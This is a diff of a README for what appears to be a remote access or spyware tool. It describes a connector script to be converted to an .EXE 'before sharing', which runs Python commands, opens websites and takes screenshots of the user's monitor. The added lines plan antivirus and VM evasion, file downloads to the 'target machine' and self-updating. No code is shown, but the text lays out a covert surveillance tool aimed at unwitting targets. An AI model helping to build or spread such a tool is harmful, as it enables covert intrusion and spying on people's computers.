@@ -14,7 +14,15 @@ _For best results, convert [connector.py] to an .EXE before sharing it_
 
 - Built in command documentation: [0: Executes a Python command. 1: Visits a set website. 2: Takes a snapshot of the users current primary moniter.]
 
-- Made with love by toughluck5
+# Features to come.
+
+> Stealth Mode [Runs more stealthy in background processes, and prevents code that will be detected by an ANTIVIRUS or VM to execute]
+
+> File Downloader [Downloads specified files to the target machine]
+
+> Software updater [Requests new versions of the moniter when they release. This will remove the need for the target machine to redownload the connecter.py/connecter.exe]
+
+> Target Machine Organization [Currently the running machine only accesses one domain, it should have its own dedicated one]
 
 # How do deploy the server?
 
